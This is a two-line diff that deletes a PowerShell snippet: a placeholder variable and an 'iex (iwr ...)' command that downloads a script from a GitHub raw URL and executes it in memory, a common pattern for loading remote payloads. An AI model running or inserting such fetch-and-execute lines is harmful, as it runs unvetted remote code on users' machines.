@@ -1,2 +1,0 @@
-$skid = "asddddddddddddddddasdasdasdads"
-iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/download.ps1" -useb)
